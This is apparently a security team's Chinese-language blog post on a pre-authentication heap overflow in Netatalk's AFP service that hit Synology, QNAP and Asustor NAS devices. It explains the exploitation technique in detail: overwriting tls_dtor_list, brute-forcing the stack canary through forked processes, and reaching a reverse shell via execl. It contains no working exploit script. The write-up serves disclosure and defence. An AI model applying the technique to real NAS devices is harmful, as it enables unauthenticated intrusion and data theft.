&lt;h2 id=&quot;network-attached-storage&quot;&gt;Network Attached Storage&lt;/h2&gt;

&lt;p&gt;早期 NAS 一般用途為讓伺服器本身與資料分開也為了做異地備援而使用的設備，功能上主要單純讓使用者可以直接在網路上存取資料及分享檔案，現今的 NAS 更是提供多種服務，不止檔案分享更加方便，也與 IoT 的環境更加密切，例如 SMB/AFP 等服務，可輕易的讓不同系統的電腦分享檔案，普及率也遠比以前高很多。&lt;/p&gt;

&lt;p&gt;現今的 NAS，也可裝上許多套件，更是有不少人拿來架設 Server，在這智慧家庭的年代中，更是會有不少人與 home assistant 結合，使得生活更加便利。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;為何我們要去研究-nas-呢-&quot;&gt;為何我們要去研究 NAS 呢 ?&lt;/h3&gt;

&lt;h4 id=&quot;紅隊需求&quot;&gt;紅隊需求&lt;/h4&gt;
&lt;p&gt;過去在我們團隊在執行紅隊過程中，NAS 普遍會出現在企業的內網中，有時更會暴露在外網，有時更會存放不少企業的機密資料在 NAS 上，因此 NAS 漸漸被我們關注，戰略價值也比以往高很多。&lt;/p&gt;

&lt;h4 id=&quot;勒索病毒&quot;&gt;勒索病毒&lt;/h4&gt;
&lt;p&gt;近年來因為 NAS 日益普及，常被拿來放個人的重要資料，使 NAS 成為了勒索病毒的目標，通常駭客組織都會利用漏洞入侵 NAS 後，將存放在 NAS 中的檔案都加密後勒索，而今年年初才又爆發一波 locker 系列的事件，我們希望可以減少類似的事情再次發生，因而提高 NAS 研究的優先程度，來增加 NAS 安全性。也為了我們實現讓世界更安全的理想。&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-mobile-2020&quot;&gt;Pwn2Own Mobile 2020&lt;/h4&gt;
&lt;p&gt;最後一點是 NAS 從 2020 開始，成為了 Pwn2Own Mobile 的主要目標之一，又剛好前年我們也想嘗試挑戰看看 Pwn2Own 的舞台，所以決定以 NAS 作為當時研究的首要目標，前年 Pwn2Own 的目標為 Synology 及 WD ，由於 Synology 為台灣企業常見設備，所以我們最後選擇了 Synology 開始研究。&lt;/p&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;h3 id=&quot;environment&quot;&gt;Environment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;DS918+&lt;/li&gt;
  &lt;li&gt;DSM 6.2.3-25426&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我們的測試環境是 DS918+ 與 Pwn2own 目標極為類似的型號，我們為了更佳符合平常會遇到的環境以及 Pwn2Own 中要求，會是全部 default setting 的狀態。&lt;/p&gt;

&lt;h3 id=&quot;attack-surface&quot;&gt;Attack surface&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;首先可先用 netstat 看 tcp 和 udp 中有哪些 port 是對外開放，可以看到 tcp 及 udp 中 在 default 環境下，就開了不少服務，像是 tcp 的 smb/nginx/afpd 等&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而 udp 中則有 minissdpd/findhost/snmpd 等，多數都是一些用來幫助尋找設備的協定。&lt;/p&gt;

&lt;p&gt;我們這邊挑了幾個 Service 做初步的分析&lt;/p&gt;

&lt;h4 id=&quot;dsm-web-interface&quot;&gt;DSM Web interface&lt;/h4&gt;
&lt;p&gt;首先是 DSM Web 介面，最直覺也最直接的一部分，這部分大概也會是最多人去分析的一塊，有明顯的入口點，在古老時期常有 command injection 漏洞，但後來 Synology 有嚴格規範後徹底改善這問題，程式也採用相對保守的方式開發，相對安全不少。&lt;/p&gt;

&lt;h4 id=&quot;smb&quot;&gt;SMB&lt;/h4&gt;
&lt;p&gt;Synology 中的 SMB 協定，使用的是 Open Source 的 &lt;a href=&quot;https://www.samba.org/&quot;&gt;Samba&lt;/a&gt; ，因使用的人眾多，進行 code review 及漏洞挖掘的人也不少，使得每年會有不少小洞，近期最嚴重的就是 &lt;a href=&quot;https://www.samba.org/samba/security/CVE-2017-7494.html&quot;&gt;SambaCry&lt;/a&gt;，但由於較多人在 review 安全性相對也比其他服務安全。&lt;/p&gt;

&lt;h4 id=&quot;iscsi-manager&quot;&gt;iSCSI Manager&lt;/h4&gt;
&lt;p&gt;主要協助使用者管理與監控 iSCSI 服務，由 Synology 自行開發，近期算比較常出現漏洞的地方，但需要花不少時間 Reverse ，不過是個不錯的目標，如果沒有其他攻擊面，可能會優先分析。&lt;/p&gt;

&lt;h4 id=&quot;netatalk&quot;&gt;Netatalk&lt;/h4&gt;
&lt;p&gt;最後一個要提的是 Netatalk 也就是 afp 協定，基本上沒什麼改，大部分沿用 open source 的 Netatalk，近期最嚴重的漏洞為 2018 的 Pre-auth RCE (CVE-2018-1160)，關於這漏洞可參考 &lt;a href=&quot;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&quot;&gt;Exploiting an 18 Year Old Bug&lt;/a&gt; ，Netatalk 相對其他 Service 過去的漏洞少非常多，是比較少被注意到的一塊，並且已經長時間沒在更新維護。&lt;/p&gt;

&lt;p&gt;我們經過整體分析後， 認為 Netatalk 也會是 Synology 中最軟的一塊，且有 &lt;a href=&quot;http://netatalk.sourceforge.net/&quot;&gt;Source code&lt;/a&gt; 可以看，所以我們最後決定先分析他。當然也還有其他 service 跟攻擊面，不過這邊由於篇幅因素及並沒有花太多時間去研究就不一一分析介紹了。我們這次的重點就在於 Netatalk。&lt;/p&gt;

&lt;h2 id=&quot;netatalk-1&quot;&gt;Netatalk&lt;/h2&gt;
&lt;p&gt;Apple Filing Protocol (AFP) 是個類似 SMB 的檔案傳輸協定，提供 Mac 來傳輸及分享檔案，因 Apple 本身並沒有開源，為了讓 Unlx like 的系統也可以使用，於是誕生了 Netatalk，Netatalk 是個實作 Mac 的 AFP 協定的 OpenSource 專案，為了讓 Mac 可以更方便的用 NAS 來分享檔案，幾乎每一廠牌的 NAS 都會使用。&lt;/p&gt;

&lt;h3 id=&quot;netatalk-in-synology&quot;&gt;Netatalk in Synology&lt;/h3&gt;
&lt;p&gt;Synology 中的 netatalk 是預設開啟，版本是改自 3.1.8 的 netatalk，並且有在定期追蹤安全性更新，只要剛裝好就可以用 afp 協定來與 Synology NAS 分享檔案，而 binary 本身保護有 ASLR/NX/StackGuard。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dsi&quot;&gt;DSI&lt;/h4&gt;

&lt;p&gt;講漏洞之前，先帶大家來看一下 netatalk 中，部分重要結構，首先是 DSI，Netatalk 在連線時是使用的 DSI (Data Stream interface) 來傳遞資訊，Server 跟 Client 都是通過 DSI 這個協定來溝通，每個 connection 的 packet 都會有 DSI 的 header 在 packet 前面&lt;/p&gt;

&lt;p&gt;DSI Packet Header :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DSI 封包中內容大致上會如上圖所示，會有 Flag/Command 等等 metadata 以及 payload 通常就會是一個 DSI Header + payload 的結構&lt;/p&gt;

&lt;p&gt;AFP over DSI :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;afp 協定的通訊過程大概如上圖所示，使用 AFP 時，client 會先去拿 server 資訊，來確定有哪些認證的方式還有使用的版本等等資訊，這個部分可以不做，然後會去 Open Session 來，開啟新的 Session，接著就可以執行 AFP 的 command ，但在未認證之前，只可以做登入跟登出等相關操作，我們必須用 login 去驗證使用者身份，只要權限沒問題接下來就可像 SMB 一樣做檔案操作&lt;/p&gt;

&lt;p&gt;在 Netatalk 實作中，會用 dsi_block 作為封包的結構&lt;/p&gt;

&lt;p&gt;dsi_block :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dsi_flag 就是指該 packet 是 request or reply&lt;/li&gt;
  &lt;li&gt;dsi_command 表示我們的 request 要做的事情
    &lt;ul&gt;
      &lt;li&gt;DSICloseSession&lt;/li&gt;
      &lt;li&gt;DSICommand&lt;/li&gt;
      &lt;li&gt;DSIGetStatus&lt;/li&gt;
      &lt;li&gt;DSIOpenSession&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_code
    &lt;ul&gt;
      &lt;li&gt;Error code&lt;/li&gt;
      &lt;li&gt;For reply&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_doff
    &lt;ul&gt;
      &lt;li&gt;DSI data offset&lt;/li&gt;
      &lt;li&gt;Using in DSIWrite&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;dsi_len
    &lt;ul&gt;
      &lt;li&gt;The Length of Payload&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;DSI : A descriptor of dsi stream&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 netatalk 中，除了原始封包結構外，也會將封包及設定檔 parse 完後，將大部分的資訊，存放到另外一個名為 DSI 結構中，例如 server_quantum 及 payload 內容等，以便後續的操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而封包中的 Payload 會存放在 DSI 中 command 的 buffer 中，該 buffer 大小，取自於 server_quantum，該數值則是取自於 afp 的設定檔 afp.conf 中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果沒特別設定，則會取用 default 大小 0x100000。&lt;/p&gt;

&lt;p&gt;有了初步了解後，我們可以講講漏洞。&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們發現的漏洞就發生在，執行 dsi command 時，讀取 payload 內容發生了 overflow，此時並不需登入就可以觸發。問題函式是在 dsi_stream_receive&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這是一個將接收到封包的資訊 parse 後放到 DSI 結構的 function，這個 function 接收封包資料時，會先根據 header 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_len&lt;/code&gt; 來決定要讀多少資料到 command buffer 中，而一開始有驗證&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_cmdlen&lt;/code&gt; 不可超過 server quantum 也就是 command buffer 大小。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然而如上圖黃匡處，如果有給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; ，則會將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; 作為 cmdlen 大小，但這邊卻沒去檢查是否有超過 command buffer。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使得 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_strem_read&lt;/code&gt; 以這個大小來讀取 paylaod 到 command buffer 中，此時 command buffer 大小為 0x100000，如果 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_doff&lt;/code&gt; 大小超過 0x100000 就會發生 heap overflow。&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;由於是 heap overflow，所以我們這邊必須先理解 heap 上有什麼東西可以利用，在 DSM 中的 Netatalk 所使用的 Memory Allocator 是 glibc 2.20，而在 glibc 中，當 malloc 大小超過 0x20000 時，就會使用 mmap 來分配記憶體空間，而我們在 netatalk 所使用的大小則是 0x100000 超過 0x20000 因此會用 mmap 來分配我們的 command buffer。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因為是以 mmap 分配的關係，最後分配出來的空間則會在 Thread Local Storage 區段上面，而不是在正常的 heap segment 上，如上圖的紅框處。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;afpd 的 memory layout 如上圖所示，上述紅框那塊就是，紅色+橘色這區段，在 command buffer 下方的是 Thread-local Storage。&lt;/p&gt;

&lt;h4 id=&quot;thread-local-storage&quot;&gt;Thread-local Storage&lt;/h4&gt;
&lt;p&gt;Thread-local Storage(TLS) 是用來存放 thread 的區域變數，每個 thread 都會有自己的 TLS，在 Thread 建立時就會分配，當 Thread 結束的時候就會釋放，而 main thread 的 TLS 則會在 Process 建立時就會分配，如前面圖片中的橘色區段，因此我們可利用 heap overflow 的漏洞來覆蓋掉大部分存放在 TLS 上的變數。&lt;/p&gt;

&lt;h4 id=&quot;target-in-tls&quot;&gt;Target in TLS&lt;/h4&gt;
&lt;p&gt;事實上來說 TLS 可控制 RIP 的變數有不少，這邊提出幾個比較常見的&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;第一個是 main arena，主要是 glibc 記憶體管理個結構，改 main arena 可以讓記憶體分配到任意記憶體位置，做任意寫入，但構造上比較麻煩。&lt;/li&gt;
  &lt;li&gt;第二個是 pointer guard 可藉由修改 pointer guard 來改變原本呼叫的 function pointer ，但這邊需要先有 leak 跟知道原本 pointer guard 的值才能達成&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;第三個則是改 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ，不須 leak 比較符合我們現在的狀況&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;overwrite-tls_dtor_list&quot;&gt;Overwrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;這技巧是由 project zero 在 2014 所提出的&lt;a href=&quot;https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;方法&lt;/a&gt;，覆蓋 TLS 上的 tls_dtor_list 來做利用，藉由覆蓋該變數可在程式結束時控制程式流程。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dtor_func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dtor_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這邊就稍微提一下這個方法，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; 是個 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; object 的 singly linked list 主要是存放 thread local storage 的 destructor，在 thread 結束時會去看這個 linked list 並去呼叫 destructor function，我們可藉由覆蓋 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; 指向我們所構造的 dtor_list。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而當程式結束呼叫 exit() 時，會去呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_tls_dtors()&lt;/code&gt; ，該 function 會去取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; 中的 object 並去呼叫每個 destructor，此時如果我們可以控制 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; 就會去使用我們所構造的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dtor_list&lt;/code&gt; 來呼叫我們指定的函式。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但在新版本和 synology 的 libc 中，dtor_list 的 function pointer 有被 pointer guard 保護，導致正常情況下，我們並不好利用，一樣需要先 leak 出 pointer guard 才能好好控制 rip 到我們想要的位置上。&lt;/p&gt;

&lt;p&gt;但有趣的是 pointer guard 也會在 TLS 上，他會存在  TLS 中的 tcbhead_t 結構中，如果我們 overflow 夠多，也可以在 overflow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; 的同時，也將 pointer guard 也一併清掉，這樣就可以讓我們不用處理 pointer guard 問題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先來講講 tcbhead_t 這結構，這個結構主要是 Thread Control Block (TCB)，有點類似 Windows 中的 TEB 結構 是 thread 的 descriptor，主要會用來存放 thread 的各種資訊，而在 x86_64 的 Linux 架構的 usermode 下，fs 暫存器會指向這位置，每當我們要存取 thread local variable 時，都會透過 fs 暫存器去 存取，我們可以看到 TCB 結構會有 stack guard 及 pointer guard 等資訊，也就是說當我們在拿 pointer guard 時，也是用 fs 暫存器從這個結構取出的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們回頭看一下 TLS 上的結構分佈，可以看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; 後方就是這個，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; 結構。只要我們 overflow 夠多就可以蓋掉 pointer guard，然而此時會出現另外一個問題。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因為 stack guard 在 pointer guard 前，當我們蓋掉 pointer guard 的同時，也會蓋掉 stack guard。那麼蓋掉 stack guard 會有什麼影響呢？&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在我們呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive()&lt;/code&gt; 時，因為有開啟 stack guard 保護的關係，會先從 TLS 上，取得 stack guard 放在 stack 上，等到我們呼叫 dsi_stream_read 去 trigger overflow 且蓋掉 pointer guard 及 stack guard 後，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dsi_stream_receive()&lt;/code&gt; 返回時，會去檢查 stack guard 是否與 TLS 中的相同，但因為這時候的 TLS 的 stack guard 已經被我們蓋掉了，導致檢查不通過而中止程式，就會造成我們無法利用這個技巧來達成 RCE。&lt;/p&gt;

&lt;h4 id=&quot;bypass-stack-guard&quot;&gt;Bypass stack guard&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 netatalk(afpd) 的架構中，事實上每次連線都會 fork 一個新的 process 來 handle 使用者的 request，而 Linux 中的 process 有個特性是 fork 出來的 process，memory address 及 stack gurad 等都會與原先的 parent process 相同，因此我們可以利用 CTF 常見的招式，一個 byte 一個 bytes  brute-force 的方式來獲得 stack guard 。&lt;/p&gt;

&lt;h4 id=&quot;brute-force-stack-guard&quot;&gt;Brute-force stack guard&lt;/h4&gt;

&lt;p&gt;基本概念是 在 overflow 之後，我們可以只蓋 TLS 中的 stack guard 最尾端一個 byte ，每次連線都蓋不同的 byte，一旦與 stack guard 不同，就會因為 abort 而中斷連線，我們可依據連線的中斷與否，判斷我們所覆蓋的數值是否與 stack guard 相同。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以上圖來說，我們假設 stack guard 是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeeffacebc00&lt;/code&gt;，由於 stack guard 特性，最低一個 byte 一定會是 0 ，這邊從第二個 byte 蓋起，這邊可以先蓋 00 試看看連線是否被中斷，如果被中斷代表蓋的數值是錯的，接下來我們就測其他數值看看有沒有中斷，依此類推，測到 0xbc 發現沒有中斷，代表第二個 byte 是 0xbc，接下來就繼續蓋第三 byte ，一樣從 0x00 蓋到沒中斷，直到蓋滿 8 bytes 的 stack guard 都沒中斷連線後，我們就可以知道 stack guard 的值是什麼，接下來我們就可以解決 stack guard 問題。&lt;/p&gt;

&lt;h4 id=&quot;construct-the-_dtor_list-to-control-rip&quot;&gt;Construct the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; to control RIP&lt;/h4&gt;

&lt;p&gt;在解決 stack guard 問題後，netatalk 已可正常運作，接下來我們需要構造 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt; 結構並結束程式來控制 RIP，在當時的 synology 的 afpd 中並沒有開啟 PIE，我們可以在 afpd 的 data 段中，構造 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;剛好在使用 dhx2 method 的 login 功能中，會將我們要登入的 username 複製到 global 的 buffer 中，所以我們可以將這結構跟著 username 一起寫入固定的已知位置。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在一切都構造完成後，我們這邊可以觸發正常功能的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DSICloseSession&lt;/code&gt; 即可觸發 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit()&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;tls_dtor_list-in-synology&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; in Synology&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 reverse 後，發現 synology 的 glibc 中，會使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__tls_get_addr()&lt;/code&gt; 來取得 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt;，並非直接存取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; 這個全域變數，而這函式的取得方式則會從前述 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcbhead_t&lt;/code&gt; 中先取 div 欄位後，再取得其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tls_dtor_list&lt;/code&gt; ，因此我們需要連同 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcb-&amp;gt;div&lt;/code&gt; 一起構造在固定位置，另外一點是 Synology 的 afpd 中並沒有 system 可用，但事實上有 execl 可以使用，只是參數稍微複雜一點而已。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最後我們構造的結構如上圖所示，我們將 tcb 及 dtor_list 結構都構造在 username buffer 中，觸發 exit() 後，就會去執行 execl 並取得反連 shell。&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/ocZkWuSCr4Y&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;h3 id=&quot;remark&quot;&gt;Remark&lt;/h3&gt;

&lt;p&gt;在一般的 Netatalk 中，是會啟用 PIE ，不太容易在已知位置構造 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dtor_list&lt;/code&gt;，實際上也可以用類似方法 leak 出 libc 位置，依舊是 exploitable，該漏洞不只影響 Synology 也會影響到大部分有使用 Netatalk 的設備。&lt;/p&gt;

&lt;h3 id=&quot;other-vendor&quot;&gt;Other vendor&lt;/h3&gt;

&lt;p&gt;我們測試了許多家有使用到 Netatalk 的廠商，發現不少家有存在類似的問題，部分是 unexploitable 但也有部分是 exploitable。我們這邊實測了 QNAP 及 Asustor，皆有成功獲得 shell。&lt;/p&gt;

&lt;h4 id=&quot;qnap&quot;&gt;QNAP&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on TS451
    &lt;ul&gt;
      &lt;li&gt;QTS 4.5.4.1741&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;內建 system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/29.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20220328/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;asustor&quot;&gt;Asustor&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;We tested on AS5202T
    &lt;ul&gt;
      &lt;li&gt;ADM 3.5.7.RJR1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Not enable by default&lt;/li&gt;
  &lt;li&gt;Protection
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;No Stack Guard&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;No PIE&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;內建 system&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;QNAP 及 Asustor 兩家 NAS 都沒有開啟 Stack guard，不需 brute-force 即可獲得反連 shell。&lt;/p&gt;

&lt;p&gt;這個漏洞在 Synology 尚未修補時，只要 default 裝好就可以利用，&lt;strong&gt;不需任何認證&lt;/strong&gt;，而 QNAP 及 Asustor 雖然不是預設開啟，但不少有使用 Mac 的用戶，還是會為了方便把它打開，基本上只要是 NAS 幾乎都會用到 Netatalk，絕大多數的 NAS 都有影響，只要有開啟 Netatalk，攻擊者可以利用這個漏洞打下大部分的 NAS。&lt;strong&gt;你的 NAS 就再也不會是你的 NAS。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220328/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們後來也從 shodan 上發現，其實也有非常多人將 netatalk 開在外網，光在 shodan 上就有 13 萬台機器，其中大部分是 Synology。&lt;/p&gt;

